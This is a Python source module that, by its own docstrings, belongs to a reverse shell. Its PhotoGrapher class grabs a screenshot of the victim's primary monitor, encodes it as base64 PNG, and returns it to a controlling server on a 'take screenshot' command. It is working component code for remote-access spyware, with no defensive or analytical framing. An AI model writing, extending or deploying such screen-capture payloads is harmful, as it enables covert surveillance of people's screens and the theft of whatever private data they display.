"""
This module handles all the Image related task for the reverse shell
"""

# 1st party imports
import base64
from io import BytesIO
from typing import List

# 3rd party imports
from mss import mss
from PIL import Image
from mss.screenshot import ScreenShot

# 3rd party imports
from commands import ShellCommands

class PhotoGrapher:
    """
    This class handles all the Image related task for the reverse shell
    """

    def __init__(self):
        """
        Initialize the PhotoGrapher class
        """

    def take_screenshot(self) -> ScreenShot:
        """
        Take a screenshot of the screen and return it as a base64 string

        Returns:
            Screenshot: The Screenshot object.
        """

        with mss() as sct:
            return sct.grab(sct.monitors[1])

    def get_screenshot_base_64(self) -> str:
        """
        Get the screenshot of the screen and return it as a base64 string

        Returns:
            str: The base64 string of the screenshot.
        """

        screenshot = self.take_screenshot()

        # Write to a BytesIO object instead of a file
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        # create a buffer
        buffer = BytesIO()

        # save the image to the buffer and get the bytes
        img.save(buffer, format="PNG")
        img_bytes = buffer.getvalue()

        # convert it to a base64 and return
        return base64.b64encode(img_bytes).decode("utf-8")

    def handle_command(self, command: List[str]) -> str:
        """
        Handle the command received from the server.

        Args:
            command (List[str]): The list of commands to handle with args.

        Returns:
            str: The output of the command.
        """

        if command[0] == ShellCommands.TAKE_SCREENSHOT.value:
            return self.get_screenshot_base_64()

        else:
            return f"Invalid command for photographer. Provided command: `{" ".join(command)}`"